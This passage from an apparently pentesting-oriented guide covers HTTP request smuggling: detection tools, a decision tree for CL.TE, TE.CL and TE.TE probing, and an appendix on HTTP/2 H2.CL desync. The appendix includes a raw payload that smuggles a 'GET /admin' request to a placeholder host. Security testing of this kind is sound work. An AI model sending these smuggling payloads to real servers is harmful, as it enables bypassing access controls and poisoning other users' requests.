# http-smuggling-test · part 2（续）

> 接 [`http-smuggling-test-p2.md`](http-smuggling-test-p2.md) 的后半段（原块 >12KB 拆分）。

## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

---
## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

### Advanced Reference


---
## 附件：H2_SMUGGLING_VARIANTS

### HTTP/2 Smuggling Variants & Advanced Desync Techniques
## 1. H2.CL — HTTP/2 Content-Length Desync

### 1.1 Concept

The front-end speaks HTTP/2 with the client and downgrades to HTTP/1.1 toward the back-end. HTTP/2 frames have their own length field (frame length), but the proxy may also forward a `content-length` header to the back-end. If these disagree, the back-end trusts `content-length` while the front-end trusts the H2 frame boundary.

### 1.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - H2 DATA frame containing: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   - content-length header: 0

2. Front-end (H2): reads entire DATA frame as body of first request
   → forwards to back-end as HTTP/1.1 POST

3. Back-end (H1): sees content-length: 0
   → treats body as empty
   → remaining bytes become: "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   → parsed as second request
```

### 1.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.example

```

The H2 DATA frame carries the entire body including the smuggled `GET /admin` request. The `content-length: 0` header tells the back-end the POST body is empty.

### 1.4 Confirming H2.CL

```
Step 1: Send H2 POST with content-length: 0 and smuggled prefix "G"
Step 2: Follow immediately with normal GET / on same connection
Step 3: If back-end sees "GGET / HTTP/1.1" → 405 or error → confirmed

Timing version:
- Smuggle "GET /sleep?delay=10 HTTP/1.1..." 
- Subsequent request on same connection delayed → confirmed
```

---
